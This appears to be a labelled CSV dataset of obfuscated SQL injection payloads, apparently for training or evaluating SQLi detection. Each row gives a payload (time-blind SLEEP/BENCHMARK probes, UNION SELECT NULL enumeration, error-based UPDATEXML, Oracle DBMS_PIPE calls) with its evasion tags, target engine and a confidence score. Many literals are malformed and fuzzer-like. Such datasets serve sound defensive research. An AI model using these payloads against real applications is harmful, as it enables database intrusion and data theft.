payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"6' ) or ( SELect (SELeCt 0x0x0o2)* ( if ( ?`( SElECt * FrOm !( |SelEct CONCAT ( 2O3X7171706a0B1000111, ?( :selECT /* B4*/ (& eLt (; 2X1Fb4 LIKE (sElEcT (selECt 0x0x0X1Fb1)),0x5O1 ) / ) ~) [,0X116a0x2ffA0b0B11110100701010101111,0X0o113 ) ) S ), , (SElecT (SELect (SeLEcT (SelEct 2X0x0b1110101110010DCfb76180bb2)))), 0B0X0B1110171110010dcFb7019fFFa [) ) ). ?&& ( 'XGzb' likE) 'xgZB",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0O4'= +) ) ]) ANd (sElEcT 7O21674) =^ LiKE: ( 'aBcdeFg',UPPER \( ~HEX/*gd.ke*/ ( RaNDOMBLob ( (SelECt 0x0X5e0xCA5b0)/0B2O4o0x8xc |) ) =) ), oR^(seLECT (SEleCt (SELecT (sElecT (seLEct (selEcT (sELEcT 0))))))) oR falsE AND TrUe AND tRUE --",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.53,rule,sqliv5_json,unknown
0x5'_$})?;/**/ )/*fEE.S#F*/ ^As~MBZK[WherE+0B16001111011111.=-0x238f`AnD/**/(SeLect/*I;*/0X2d6):_likE 0x0x0O9B0x0b111d4]t,unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"3""^ ), ) ) oR %0x0X0X0O0O21b7 Like bEnChmaRK ( 0B131x0c4B56,md5 <(; 0x549D5a4c`}&) }) ) Or`false oR|FALSe or faLSe!Or`FALsE and (selecT (sElECT (SELECT 1))) OR OR False#faLsE Or 0b0x1089=(sELect (SElEct (seLeCT 4434))) aNd/**/TrUE and TRue AnD (SELECT 1) Or 9779!=9779#pLR@C=f;D}ss?Bv",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
0B1'+~ (! SEleCT~'hcQf'}where.(sElect (SeLeCt (sELecT (SELECT (SELECT 0x43ac))))) LikE 6X0O32E4/*{oB*/ And ( 0xa85 LikE. 0B1000011011011}%)?\*(selECT (sELECT 0x10C9)) )/ +',unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"8'& Or!@@/*:m>e :C~EAe*/( *SELEct 'gved' from.DuAl""whErE (SelECT 4x0X1849)/*g0b1001>Dh*/?`liKe"" 0o14107",unknown,oracle,case_variation|comment_whitespace|inline_comment,0.06,rule,sqliv5_json,unknown
"0o4' OR ( sElECT (SeLEct (SELECT.(SeLeCT\0X23D9))) FRom /( selecT cOUNT ( *[ ) ,cONcat ( >0X0177703a0x0B171133, ( sElecT ;( <ELt (/ (SELecT 0o0O1x0b10O0x534d) LIKe (seLeCt 7o0O0O33125),(SeLEcT 0X1) ]])& ? ) ) ;,4X0x4cdA0X0o2fFA3B1807111,fLo( OR ;* ( R(anD /( 7X2 ) *3O2 ) > ) X FROm inFOrMAtion_SChEmA.CHaRactER_SEts gROup%by x &)! A ) and 'SCyE'/*z/H*GpljX8XLw8<Zyo5-i*/liKe 'sCyE",unknown,unknown,case_variation|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_single_quote
"1"" ) ?`) as kMSS wHERe 0o7283=(SeLect 0O6312) anD CHaR ( 0B1x66] )$'||cHar& ( (sELeCt (SELECT (SELECT 78)))}/*,Ezh$0o37-])?*/)^ oR chAR ( 0o166 ) ||ChAR ( 0x5A ) lIke rEGEXp_subStRIng ( RePEAT *( RIgHT (}*chAr <( (SeLEct (seLeCT (SELEct (sELeCt 0x138b)))) ) ,(seLEcT 0x0B4)/**/ ) ,0b148x12A3B101F250^ ) ,NulL ): ANd tRuE aNd (SelECT (SELECt (sELECt (SELECT (SELECT 1))))) or false&anD trUe Or faLSe OR (SELECT 0) && ""^r""!=""^r AND True#"" --)RP",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"1""/ ). OR ;upDaTexml ^(= 0x0O1324,CONcat ( ;0x0x0o2e,0x0x0X6D0B110e0x0B111aA06, $(`;sElect;??( ElT (/*8k*uN$T&*//*OE(sg!an $*/(SElect[(sElECt (SeleCt (seleCT (sElECt 0X5B1011000110))))) ]LiKe 4x710,0x4} ) | ) >), ,0x9b1111701101a0B0X2ffa79 ) <,0x2176 ) && ( ""IGop"" ?LiKe $""iGOP",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1'+ ( sElect+afst+wherE 0x0x1Bf2=0B0b110101111110 and (SelecT](SelECT (SeLECT (sELect (sELECT (sELEct (SELECT (SELECT (SELECT 0xc82))))))))) ""= /**/likE ( 'AbCDEFG',uPper ( hEX ?( RANDOmBLob (~ 0x1dcD6500/0O4X0O0B0 ) ~) + ) ) ` ) +'",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|hex_string,0.53,rule,sqliv5_json,unknown
"8o5B0o0B0O4B0o0o0b1o1'+)|(`|SElEct+'IdmR'|WHeRe((SelEcT 2x14A5);`=/*>M*}GDpvm2Y0o0B11V Pvzj64Oc 8MM?tcW2Wf7<;,MvI */`(sElecT 2B7010110151107)\uNioN$ALl>SeLEcT%nUll,nulL,nULl,nuLl,NULL,Null--",union_based,unknown,case_variation|inline_comment,0.8,rule,sqliv5_json,unknown
"0B0O12'+|>(/*k7-0UplO]vn((seLEct (sELECT (SeLecT (SELECt~(SElect 0X0)))))|aDU6*M*/aNDtRue OR falSE or FAlse'AND[0b1 OR FalSe or fAlSe aNd tRUe#SelECt=DKlk`WHerE|4X0X3b84100101E%{= &0X0O0X5AA0%uNiON alL]selECt>Null,nulL,null,nulL,nULl,NUll--0X5+",union_based,unknown,case_variation|inline_comment,0.8,rule,sqliv5_json,string_single_quote
1 AnD TRUE# ) ) ) or ( sElect * frOm ( &SeLeCT (/*R]m4F*/ SLEEP ( 0o0b11X0O3X0B400 ) ) ) SDDO ) oR (SeLECt (sELEcT (sEleCt (sELECT (sELecT (SeLeCT 9))))))#>X,unknown,mysql,case_variation|comment_whitespace|inline_comment,0.05,rule,sqliv5_json,unknown
"2 ) [ or ! && "";"" nOt\LIke "";z"" Or (seleCT (sELEct (SEleCT 0B0))) or FalSe OR (selECT 0x1DE9)!=(SELEcT+7057) && (sEleCt (SELeCt 1)) aND (sElect 357)<>(SELEcT 358) and truE or 0XD21!=(SELECT 3361) And """"V""<>""""VE""#(selEcT 0x15b4) >LiKE `( SeLeCt COUnT [( *] )[ From RDb$FiELdS AS^T3,RDb$TyPES aS*t0O3b5B0b10,Rdb$coLlatIoNs\AS t0o3,rDB$fUNcTiONs.AS T0o0o5o4 ) And_% (( 0o0X105c/**/ LIke] 0O0b90110111130KjA",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
0b1' ) where 0o14144 LIKE /**/0b0b0b1110101100011001010011111000111000011100000001000001101001000000100100101111011110111001011010101000010011100001100000000111111101100 rlike ( select * from !( select ( sleep ( (SELECT 0b101) )/*0x2!r?:*/ ) ) ~sgvo ]) OR False --,unknown,mysql,case_variation|comment_whitespace|inline_comment,0.05,rule,sqliv5_json,unknown
"1b0O0o0o0b11'] ).)anD0b1016913411011 nOt liKE (SEleCT 1X14dC) OR False#/*O:O/m)Yoi*/)+=/**/?oR[sleep$*((?7b2B2O25b0o0O3O0b9o050:/)%>)aND% (/*k/:(F8~(SeLEcT (SelECt (seLeCt (SELECT (SELECT 0)))))*/ )( $*'UZHD',likE;'UzhD $`lz 4EcG",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"1%' ) ) Or sLEep\ ( /*R0B10fE)r1M\am@E)kh_*/0B0b0O0b0B7O0o241 :) Or 7B0 oR (selECt (sELeCT (seLeCT (SeLECt<(selEct 2409))))))NOT LiKE (sElEcT 2420) oR 'a;' =& 'a;$' OR (sELeCt 0O0) oR (sElECt 0)>Or 0O0 aND= ""Z;CB"" not LIKe ""z;cBh"" or FAlsE# ~~C] i]",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_single_quote
"1%'"":* ):~{ < && -"" 0X17a0O0X1 lIKE cTxsyS.drITHSx.sN (] (sELect;(SELecT (SeLect (sElecT (SeLeCt (SeLEct 0X1B8f)))))), ( CHr ;(| (SElecT 0X7x71) ) _ oR <CHr ( |0b0b5x0o107 ) or`CHR (&((SElECt$(sELeCt (SELeCt 0x0b1210010)))/*P*I:@Pa_:*,i;/&Y*/ ) oR cHr ( $2x6A ) Or CHR? (:)(seLecT (seLECT (SelECt (SeleCt 0x71)))) ) Or >( ^SELecT ( CasE when <,( 6x15a7=0b1310110103211;?). then 2B0X0x0X1 Else>0b0b0x0X0o0O3B0o0B0X0 eND ) )from{dUaL. ). oR CHR^`(` (sELEct 0X71) ) or ~ CHR ( ;(SeLect(0O0x0b0O157a) ) Or CHr () (SEleCt~(SElEcT 1X4X1aA)) )/*U&P`/Ryg&!Y8fwdzaFj */ ; Or cHr -( 0x0x162 )& Or cHR ( (sELECT (SeleCt 0Xad)) ) ) & \)^{ ANd ( '%' &= '",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.51,rule,sqliv5_json,unknown
"1%"" `) oR 0XA49 >= DBMS_PIpe.receive_MeSSAgE ( CHR ( (sELECT (sELEcT 0x74)) ) || !CHR ( 0X0o25 )+~ or CHr =( 4x9o5x0b0B11o51? ) oR or False oR ""^S""=""^s:""\OR (sELeCt (seLEcT 0X0)) Or falsE oR (seleCT (selEct 2023)) not LIKe 3X7EA \and TRUe aNd True OR (SElect 8575) like (SELECT 8576)#CHR ( (seLecT (SeLecT (SElECt 103))) ) /**/,(SelECT<0B0X2) ) ^ANd ^-( ""%"" ;like <""E",time_blind,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"9B100o3%"" ) )= aND 0X0B452fd0b100 lIKE like ( 'AbCdEfg',UPPeR ( %Hex ( RaNDOMblob [( 2o0o32435623901/0x2 ): ) ( /*)t0CYzTh{ 2it&nJO\Yi*/ |) ) oR (selECT/*^/ .(SELECT 0x1e)�E<{ */0x0X245B) LIKe[(SELEct|0X10d0O0b107) && (seLEct*(SelECt (seLecT (seLECt (SeleCt 0X8))))) Or FAlse Or 0o0x1dEc/*!pL1*/noT LikE* 7x1deC &&,true(Or 0x0 And$ (sElecT 1)aNd(sElEct (sElEcT (SELECt 1))) Or fALse ANd (seLECt;(SeleCT (SELECT 1969))) NOT LIKE (SELECT 1974) anD<truE OR 1976 NOT LIKE.1976 OR 0 OR False --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,numeric
0X9X1%' oR 3x4990 liKE ( SELEcT*2X4X0o0X1F6A FroM pg_sLeEP} ( 9O0x5 /*XUy2B*/?) ) ^ OR?(sEleCT@0xDF) ;NOt LikE 9xDF OR False Or 0b0x9C NOT; lIKE (SELEcT (SELECT (SELECT 156))) OR FALse --,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
0b0b1'+ ( sELecT MAVU+wHere/*K/B0*/0b0b1110100011010101001111110101010010010100 /**/ lIKe ;0X10b4 rlikE SLEEP/**/ ( 5; ) #,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0B1"" ) whEre~(selECt (sElEcT (SeLEcT (sELeCt (seLEct 3404))))) Like (SeLeCT 0XD4C) AnD/*oSeO|j~Ef*/0O0O0x453c?{LiKE, _And :TRUe AND true Or (seLECt 0X1175) NOt IN ((sElEct (SELEct (SElECt (sELecT 0X2274)))),(SeLECt or FalsE OR FaLSe && tRuE oR 0#(SElEct (seleCT 8821))),0O0X227D)_OR 'v~' nOT Like 'v~' || fALSE#Like? ( 'AbCdEfg',uppER/*t(<'*/ ( Hex, ( randOMbLob \( (select (SElect 0X1Dcd6500))/0X2} ) ) ) , - ) ) aNd 0X6E1 nOT liKe>0X6E0O0O2 --J^x`Y/A:z9 |",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,in_clause
0O0B3'+/**/%(] sELeCt QdOn=wherE-0x0B0B10101011111600ed liKe* 9B0b5b20060013101101,unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"5"" ) WhEre 0x0O0o0o2365 ={(sELeCT 0x689) oR-(Select/(SeLEct (sELECt 0X1d01))) .=$ dbmS_PIPE.RecEiVE_mESsAGE .( CHR }( 1b1110100 ) Or cHr (* 0X79$ ) ||ChR ( 30 `) OR(CHr< (, (seLect (sELECt 0B1101101)) ) ],0x5^ ) OR fAlSe aND ';K~'=';K~' AnD (SeleCt/*uNa>*0X4 or (seLect*0) or fALsE ]or falSe anD TRUE or fAlSe AnD ';T' LikE ';T' OR FaLSe oR false && TrUE && TrUE#xST r0*/0o0o0X0O25C4),NOT!LIKe 1945 OR faLse*or""fAlSE#oR 0||(sElECt 4686)=(SElecT 0Xa2F) AND'(SeleCt (SELECt 1))$Or faLSE oR (seleCT 1706) Not LikE (SELeCt 2006) --!!;#G",boolean_blind,oracle,case_variation|inline_comment|function_alternative,0.46,rule,sqliv5_json,string_single_quote
"0b2o2x1'+ >(;~sEleCt~'ZIrH'[wHeRE (seLeCT (SElEcT 0x0X0X7X0x7A0b114e))/*ley[V9*/$lIKe) 0O5X385E!and (sElEct;0x0O0B1110010101100) <*LiKe^ bEncHMARk _(% 0X0b0B0x32df3x4X5xe,mD0O5(:(} 1x3x496287D/** ;+*/, )-?]+) } ) +'X",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
sELEcT ( case wHeN ( (seLECt (SELECt (SelECT (SelECt (sElECT (SELECT 7227)))))) liKE 0x1dCF )@ \Then 0x1c31 ELSe (SEleCt (sElECt 0X1c2a))* ( SElect 0O10171 FRom|iNFOrMaTIon_scheMA.ChARaCTeR_SETs ) eNd )/**/ OR FALsE or falSe And '3' liKe '3' aND true ANd TRuE or FALSe#yh,boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"ELT (< (SeleCT]0X15c5)=0x0x0X0b11x0o3315,0x1/;) /*JUd|QeL=*/",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"1'>?)~ OR |(selEct;0o11x1b100401000200) ?LikE bEnCHMark\:(>$3X0B100c0x0O4B0B101000,mD7 ( 0b1009X9b7b0B0O0B10011110010a0B1001010001091 ) ) AND/**/ (/**/>'FFzV' =-'FfZv",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0o0B3B0O0o8X0B2O0O0O0O0B0o0O0O0O0O4O1B0O0O1b370101912509""/*|]LtFKoEMNJJ0O7m*/-) >,uNIoN alL/*(selECt/(sELeCt!(seLect}(SELect[0b7x7))))w3.(seLecT""4)vk5b*/SELEcT/*&/fXFR:3iJR(I<(SeleCT;(SELEct\(SeLect/**/(SELECT@(seLEct (sElect (SELEct/*G (SELECT 4)*/(sELeCt (SELECT 2)))))))))*/nUll,null,NuLl,NULL,NulL,nuLL,nUlL,nULL,nulL,NUlL--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
1 )/**/ As zZiP wHERE 0O0o12311 &=` 0o0X0B0B10001010110E0b8091 and (SElECT+0XD15) LIkE;? /**/3094,unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"9%"" )> && (SELECT 3416) IN ( + ( ChAr, (_ (sElECT (SELECt (SeLECT 113))) ) +ChAr ^( 0o615 ) +chAR ( (SELEcT (SEleCt 812)) ) +CHaR or FaLse OR fALse#( 0x9C ) +CHAR ( (seLEcT (selEcT (seLECT (SELECT 113)))) ) + ( seleCT; ( CAse wHeN ( 0XEbf LiKe (sELEcT 3715) ) tHEN ChaR ( 0b100x31 ) eLSe ChAr ( (selEct (selECT (sELect 48))) ) ?eNd ) ) +ChAr ( 0x0O0x71 ) +CHar ( 0O172 ;) +CHaR ( 3b0x0O162 ) +chAR ( (SeleCT (Select (sElEct 0X7A))){ ) +chAr ( (sElEcT (SeLecT 0x71)) ) ) ) anD ( ""%""/*(&lnMhYecc8P7n o$&[3YcjAzCCt, ~bpO 5*/LIKE ""+""PI",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,in_clause
"9x7""? );}`WheRE (SElecT 0X0X8cC5) lIkE ,0B0X1BfD Or 0o0X0B0B101001111111111111011013E lIKe BEncHmarK (?$0X0b100C4b0X0b10e,MD5*oR (seLEct (SELeCt/**/(seLeCT~(seLeCT 0Xd0O7a))))!=0O9XD7A#oR FalsE; OR ""e""!=""E"" oR fAlSe`&& TRUE && tRuE oR (SElecT (SelEcT 0)) OR FaLse# ( 0x294A2745 /*&tIMo0B100111*/ ) [[) >--h,UtsX D;5l})lAw ; y",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"2'/*jI;cA{MX^_.8m*/ ) OR`(sElect\0X0b0X66d0b0B0B1111110010A) >@LIkE bEnChMARK;$(` 0X4C0b101ec7O4,md7 .(:~0O0x0x5o0O11X606A4789 ) ? ^)/ $ And <( &'NOND'`+LiKe +'nond",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"]?(/* (seLECt (SelEct (sELeCt (SeLEct (SELECT 0x9)))))$q]{8o3n AND (SELECT 1) AND True#*/ SeLecT *`fROm (;^seLECT (^ sLEEP& ( 0X0o2 )- ) <) SRMQ )aNd ( ( ""xEki"" LiKe ""XeKifi",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
0x1'+ ( SeLecT 'nlVq' WHere 0b0B1110101101000 = (SElect (seLect)(sELeCT 0o0X0B1E0b1011110))) oR ( SelecT * fRom ( SeLeCT ( slEEP ( 0o7 \) ) & ) SDDO ) && trUe or (SEleCt (SELecT 0b1001111110110))<>3X0B1100F9}and/**/(SELeCt (SeLEct (SeLEct (sELEcT 1)))) oR fAlse#|M1z. O,unknown,mysql,case_variation|comment_whitespace|inline_comment|scientific_notation,0.05,rule,sqliv5_json,unknown
"8%"": ) )?"" ) ;Or].chAR@ (}~(SEleCT (SELEct 0o4X5X42)) ]) / OR ChAR .( ?0o105 ) OR chAr (? (seLECT 1x3O0X5b) ) OR;>char ( (sELEcT 0X52); ) & =]rEGexp_sUbStRIng (; RepEAT (] RIGht ( cHAr ( (SELEcT 0xd0o3d) ) ,(SelEct 0X0O7X0) () :,0x0o0o520626056254 )/*((SELect (sElECt (SELECT 7)))^*/ ,NULl )( && ( ( ( ""%"" = """,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"7"" and ( sElEcT 0x0O355B FRom ( sELect COUnt ( * ) ,cOncaT> ( 8O0X7671706a71, ( seLeCT } ( eLt -( 0X0X836b likE 9067,(SeLECt (selECt (SElect (sElecT 1)))) ) ) $ ) ,0x117a567A71,fLO Or ( rand -( *(SELEcT (SeLeCt (selECT (sElECt 0)))) ) *(sElEct (sELeCT 2)) )/**/ .) X FRom inf or MaTion_SCHEMA.cHARaCter_SEts GroUP by x/*ht*/ ) {a )",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"select dBMs_piPE.ReceIVE_mesSAge ( cHr ( 0B6b100100111001010110030 ) > OR ChR }( (seLecT (selEct (SelECT (seLect 0o0o141)))) ) Or cHr ( @(sEleCT (sElECt 0x0O7F)). ) /**/Or chR} ( (SeleCt (selECt (seLeCt (SELECT 101)))) )> ,7X5b0O0O0B0B0x5 )' FrOM dUAl aNd [( ( ""Gydr""[lIKE.""Gydr",time_blind,oracle,case_variation|comment_whitespace|inline_comment,0.51,rule,sqliv5_json,unknown
"1%""_ && uPDAtexMl {(( (SElEcT (seLEcT (SELECt""0o0Xf0B107011))),coNCAt`)([ 8X8E,0o2x3871708A1, (&@sEleCt ; ( ELT ~(^ 8xED0x1/**/ like >0xd25,0o0x0o1. !)- ) \): ,0x4x0O0O0o2443a0o0o0b1011311111A78 ;) _,(sElEct 0o0X0x489); )`: ANd\""%"" <LIke \""",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"6B9o8%' ) : ); *+ `and & /*zpU^(SELECT 3)*/]@ (@}(seLect 0Xef0b0b1020); LikE; (seLECt?0b0xbea)"",) *5X0B2a91 ANd ; ](? (\ '%' = '",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"7%""!and 0X1Xa0b101C= >( sELeCt CoUNT ( * ;) +froM sYsuSers~As sYS1,sYsUSeRS as sYS8,SYsuSErS AS sYS3,SYsuSErS aS SYS3O8,SySUseRS as sys5,sysUsers As SYs0O6,sYsUseRs AS SYs3x3 ) oR (SELeCt{(SELECt (SeLEcT (SeLeCt 0x1BA))))""NOt lIke ""2x0o0o1ba Or;'eM'/**/NoT lIKE 'Em' anD ""d""@nOT=""dL""|Or!(SELeCt'(SelECT (SElEct (sEleCT 0x6Fb2)))) NOT?LiKE/4X1faA and '^y'@ NOt LiKE '^yp'+ANd TRUE aNd (sElECt 0B0X1)&&""[ "" not LiKe ""[ M"" AND TRue OR falSe oR (selECt (sELECt (SELECT (SELECT 0)))) or FALsE]--",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"SELecT<, ( CAsE When ( 1499=0X133b ) THEn (sEleCt (SElECt 0xDAB)) ELSE (sELECT 9)/ +(/**/ SELecT 7B0X9x0O0O0 ) end ) or ~FALse,and)(SeLecT 0o1) Or fALSe --",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0x7.OR SlEeP =(""'0X0b0o0x0X0o0b0O145:/*(select 8)%vW7h`*/) ] AND~(SelEct.0xA0B10841)!=0xa1A Or false or (sELecT (SELeCT (selECT (SELEct 3567)))) NOT: LIKE (SeLEct 0xdef) oR ""L"" nOt liKE@""l""# TDGbY0o7IK;",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,string_double_quote
"1%"" ) ) ] /*;RIQ*/ oR cHAr ( (SeLeCt 0X0b100b)! )+ OR@ cHAR ( (sELecT (SELecT (SElECT (sEleCT (SElecT 0X46))))) ) oR Char ( (SelecT 0X63)/`) ||CHar ( 0O0b0b16110110109191911051 ) =REGEXp_SuBsTriNg ( [repeaT ( \LeFT ( CrYpt_kEY ?( ChaR ( 9x0o0x5O51 ) or chaR ($ 0O0O105 ) Or ChAr ( [0x52 ) ,nULL ) ,0X0 ) ,(SeLEct|(selECt (SElEct 0X2a022266))) ) ,NULl ) or falSE And (SELECT (sElEcT (SeLeCT (seleCt (selECT 0x1)))))_&& trUE or FALsE oR falSE AND TrUe.AND TruE And (SELECT 1) --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"0o2""{and SlEEp ;(! (SeLECT 0X0x7X0b3o0b111110100001)/**/&) +AND ""TDiD"",Like/**/""tdID",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0O0', ) ( )?$ rlIke ( (@ SeLECt (/**/ cASE?whEn -(/*Sq@[mhTv[:R*/ 0O0B0b0b1110101100011001011000001000010011011010000100011000001111010101111000111000100110011101111001011010101000100000111101100111010001000 LikE `4O0o7o3X1e0o0? )$ THEn:(sElecT 0x0B1) elSe 0X84&End >) )* ^ANd liKe ( ( 'czQk' liKe 'Czqk",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
1') ) ) '|>As}kDsE whErE 1167 LIkE ~(SELecT 6767) rlIke SlEEP ( (selECt@(seLEct 5)) ) ~ anD/*I;b?*/(SElect (SELect (SELECT 1))) OR (sELeCT 0X0b1000) OR False#gs=?;b,unknown,mysql,case_variation|comment_whitespace|inline_comment,0.05,rule,sqliv5_json,unknown
"1"". ) ANd (sELecT 0B1011110100111)=CtxSYs.DriTHsX.SN ( 0o0B0B1011110100191, <( cHr ( (selEct (SeLecT (SElEcT (Select (seLECT (seLEct 113)))))) ) ?||chR ( 0X1X0B1000111 ) ||CHr (($oR FalsE oR FAlSe Or "">"" nOt lIke "">"" OR FaLse or False#[(SeLEcT (SEleCT (SeLEcT (sELeCT 0X6e))))& )""_ Or Chr ( (selECT (seLEcT (seLEct (SELECT (seleCt (SElECt (SeLecT (SELECT 108)))))))); ) or chR )( 0x0x0o0x2F ) or ( sELecT (} casE whEn ( 0O0x354f lIkE (seLect (SelEcT (SelEct 0x0x17A7))) ) ThEN (SelECt (SELeCt (SELeCT 0x1))) ElSE 0O0X0x4x0B0 EnD ) frOm duAl ) Or chr ( (SeLeCt 0o161) ) OR$ CHR ( 0b1151010 )/**/ ||chr (` (sElECT 0B0x0x0X2O0x6F) ^) ||chR& ( 0o172 ) Or ChR ( (SeLECt 0X75) [ ) ) ) And +( ""rRbl"" LikE ""RrbLBM",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.51,rule,sqliv5_json,string_double_quote
"0b2 ) & ) As cuSv%where!(sElect 0B0X16f6) lIkE 8X1507%aND?ELt *(</*uUfV2)@) &!Q`;*/0x3X4ba=7x4BA,SLeeP ( (selECt (seLeCT 0o0x1X5))@ ) )/ && (/*?fg*/tRuE ANd true aNd<TRuE AnD TRUE And TRUe oR (sElECT (sELECT 0XdeF))!=(sElEct 0XDef) Or FAlSe oR FALSe --",unknown,mysql,case_variation|comment_whitespace|inline_comment,0.05,rule,sqliv5_json,unknown
"6'; ) ); ) OR ChAR_ ( 8O109~ ) OR chAr ( 0X45? ), oR CHAR >( (SeLeCT 6X0B0b11011000111111101) ) oR Char +( 1o0B0b11110110100110111111 ) }=rEGeXP_SUBStRING ( REpeAt ( RIghT (/*p4i.pb(GZ.R~ Qo*/ chAr> ( @0b10O3B8b0b10011011110001001111001010101000000111010000110011101100000001000111111111001000100011001100101100100001100001111111101111110010011001101 )`/*Z;LuW17""!*/,0X0 ) ,0O0x0o0B100b1100A0o5f208 ) ,nuLl ) && ( (, [< ( 'ujJR' LIKE 'UJjr",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
